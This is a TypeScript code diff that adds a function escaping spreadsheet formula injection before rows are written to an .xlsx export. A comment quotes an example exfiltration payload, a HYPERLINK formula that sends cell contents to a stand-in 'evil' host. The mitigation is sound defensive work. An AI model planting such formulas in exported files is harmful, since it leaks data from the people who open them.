@@ -90,6 +90,17 @@ export async function parseXlsxToObjects<T extends Record<string, CellValue>>(
   return out
 }
 
+// CSV/Excel injection mitigation: if a cell text starts with =, +, -, @, tab
+// or CR, Excel and LibreOffice interpret it as a formula. A malicious value
+// like =HYPERLINK("http://evil/?"&A1, "click") exfiltrates data when the
+// recipient opens the file. Prefix such cells with a single quote so the
+// spreadsheet treats them as text. Numbers/booleans pass through unchanged.
+//   https://owasp.org/www-community/attacks/CSV_Injection
+function escapeFormulaInjection(value: CellValue): CellValue {
+  if (typeof value !== 'string' || value.length === 0) return value
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
+}
+
 /**
  * Writes one or more sheets to an .xlsx file and triggers a browser download.
  * Drop-in replacement for the SheetJS pattern of book_new + aoa_to_sheet +
@@ -102,7 +113,7 @@ export async function writeXlsx(filename: string, sheets: XlsxSheet[]): Promise<
     // Excel limits sheet names to 31 chars; mirror SheetJS behavior.
     const ws = wb.addWorksheet(sheet.name.slice(0, 31))
     for (const row of sheet.rows) {
-      ws.addRow(row)
+      ws.addRow(row.map(escapeFormulaInjection))
     }
     if (sheet.colWidths) {
       sheet.colWidths.forEach((w, i) => {
